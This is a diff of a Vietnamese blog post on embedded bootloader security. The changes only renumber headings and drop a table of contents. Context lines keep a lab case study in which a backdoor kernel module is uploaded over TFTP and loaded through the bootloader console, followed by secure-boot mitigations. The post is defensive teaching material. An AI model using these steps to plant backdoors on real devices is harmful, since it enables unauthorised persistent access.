@@ -9,24 +9,7 @@ mermaid: true
 render_with_liquid: false
 ---
 
-## 1. Mục lục
-- [1. Mục lục](#1-mục-lục)
-- [2. Các lỗ hổng bootloader phổ biến](#2-các-lỗ-hổng-bootloader-phổ-biến)
-- [3. Case Study - Penetration Test](#3-case-study---penetration-test)
-  - [3.1. Mục tiêu](#31-mục-tiêu)
-  - [3.2. Môi trường lab](#32-môi-trường-lab)
-- [4. Triển khai Bootloader Attack](#4-triển-khai-bootloader-attack)
-  - [4.1. Chuẩn bị payload](#41-chuẩn-bị-payload)
-  - [4.2. Upload lên TFTP server](#42-upload-lên-tftp-server)
-  - [4.3. Khai thác bootloader](#43-khai-thác-bootloader)
-  - [4.4. Kết quả](#44-kết-quả)
-- [5. Giải pháp khắc phục](#5-giải-pháp-khắc-phục)
-  - [5.1. Secure Boot Technologies](#51-secure-boot-technologies)
-  - [5.2. Best Practices](#52-best-practices)
-
-Bài viết này phân tích các lỗ hổng bảo mật trong bootloader của thiết bị nhúng và trình bày một case study về cách khai thác để cài đặt backdoor.
-
-## 2. Các lỗ hổng bootloader phổ biến
+## 1. Các lỗ hổng bootloader phổ biến
 
 | Lỗ hổng | Mô tả | Khai thác |
 |---------|-------|-----------|
@@ -36,15 +19,15 @@ Bài viết này phân tích các lỗ hổng bảo mật trong bootloader của
 | **Firmware update không an toàn** | Cơ chế cập nhật firmware yếu | Cập nhật firmware chứa malware |
 | **Pre-secure boot access** | Truy cập trước khi secure boot | Cài đặt malware trước bảo vệ |
 
-## 3. Case Study - Penetration Test
+## 2. Case Study - Penetration Test
 
-### 3.1. Mục tiêu
+### 2.1. Mục tiêu
 
 Trong quá trình pentest, phát hiện endpoint `http://vexpress.arm:8000` kết nối tới console của thiết bị nhúng.
 
 **Target:** Cài đặt backdoor để có shell access và liệt kê processes.
 
-### 3.2. Môi trường lab
+### 2.2. Môi trường lab
 
 ```mermaid
 graph LR
@@ -53,9 +36,9 @@ graph LR
     B --> C
 ```
 
-## 4. Triển khai Bootloader Attack
+## 3. Triển khai Bootloader Attack
 
-### 4.1. Chuẩn bị payload
+### 3.1. Chuẩn bị payload
 
 Tạo kernel module backdoor và init script:
 
@@ -86,7 +69,7 @@ root@kai:~/Desktop/backdoor-files# ls
 S60kernel  processenum.ko
 ```
 
-### 4.2. Upload lên TFTP server
+### 3.2. Upload lên TFTP server
 
 ```bash
 tftp tftp.server
@@ -96,7 +79,7 @@ tftp> put processenum.ko
 Sent 124012 bytes in 0.0 seconds
 ```
 
-### 4.3. Khai thác bootloader
+### 3.3. Khai thác bootloader
 
 Truy cập console qua web endpoint và thực hiện:
 
@@ -126,16 +109,16 @@ Bytes transferred = 370 (172 hex)
 => reset
 ```
 
-### 4.4. Kết quả
+### 3.4. Kết quả
 
 Device reboot và backdoor tự động chạy với **PID 903**.
 
 ![Attack Result](/assets/img/post/bootloader-security/Untitled.webp)
 _Backdoor đã được cài đặt thành công_
 
-## 5. Giải pháp khắc phục
+## 4. Giải pháp khắc phục
 
-### 5.1. Secure Boot Technologies
+### 4.1. Secure Boot Technologies
 
 | Solution | Mô tả |
 |----------|-------|
@@ -144,7 +127,7 @@ _Backdoor đã được cài đặt thành công_
 | **OP-TEE** | Trusted Execution Environment |
 | **Tianocore EDK II** | UEFI secure boot cho ARM |
 
-### 5.2. Best Practices
+### 4.2. Best Practices
 
 1. **Disable Console Access** trong production
 2. **Implement Code Signing** - chỉ chạy signed code
